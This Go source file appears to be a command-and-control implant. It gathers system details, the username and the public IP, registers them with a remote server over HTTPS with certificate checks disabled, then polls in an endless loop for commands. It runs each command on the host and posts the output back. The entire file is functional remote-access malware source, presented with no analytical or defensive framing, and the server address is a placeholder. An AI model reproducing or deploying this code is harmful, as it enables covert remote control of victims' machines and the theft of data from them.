package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

var (
	IP        = "127.0.0.1"
	SleepTime = 10
	Jitter    = "0"
)

type system_info struct {
	Stats     *host.InfoStat
	Memory    uint64 `json:"total"`
	IP        string
	USERNAME  string
	SleepTime int
}

func register(serverIP string) string {
	// Gather system info
	stats, _ := host.Info()
	user, _ := user.Current()
	v, _ := mem.VirtualMemory()
	// get ip
	resp, _ := http.Get("http://api.ipify.org")
	body, _ := ioutil.ReadAll(resp.Body)
	ip := string(body)
	// set info in the requests json
	host_info := system_info{
		stats,
		v.Total,
		ip,
		user.Name,
		SleepTime,
	}
	fmt.Printf("%s", user.Name)
	postBody, _ := json.Marshal(host_info)
	responseBody := bytes.NewBuffer(postBody)
	//fmt.Printf("%s", serverIP)
	//resp_register, _ := http.NewRequest(http.MethodGet, "http://"+serverIP+":5000/api/1.1/add_agent", responseBody)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/add_agent", "application/json", responseBody)
	resp_register.Close = true
	body2, _ := ioutil.ReadAll(resp_register.Body)
	agent_id := string(body2)
	return agent_id
}

func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
	post_body, _ := json.Marshal(map[string]string{
		"id": agent_id,
	})
	postBody := bytes.NewBuffer(post_body)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp_query, _ := http.Post("https://"+serverIP+"/api/1.1/get_command", "application/json", postBody)
	resp_query.Close = true
	resp, _ := ioutil.ReadAll(resp_query.Body)
	out := string(resp)
	tokens := strings.Split(out, ",")
	command := tokens[0]
	if command == "None" {
		time.Sleep(sleepTime * time.Second)
	} else {
		fmt.Println("Received command")
		commandID := tokens[1]
		args := strings.Split(command, " ")
		parsed_command := args[0]
		args = args[1:]
		out, _ := exec.Command(parsed_command, args...).Output()
		output := string(out[:])
		resp_body, _ := json.Marshal(map[string]string{
			"implantID": agent_id,
			"commandID": commandID,
			"output":    output,
		})
		responseBody := bytes.NewBuffer(resp_body)
		http.Post("https://"+serverIP+"/api/1.1/command_out", "application/json", responseBody)
	}
}

func main() {
	agent_id := register(IP)
	fmt.Printf("Agent ID: %s\n", agent_id)
	time_dur := time.Duration(SleepTime)
	for {
		get_command(agent_id, IP, time_dur)
	}
}
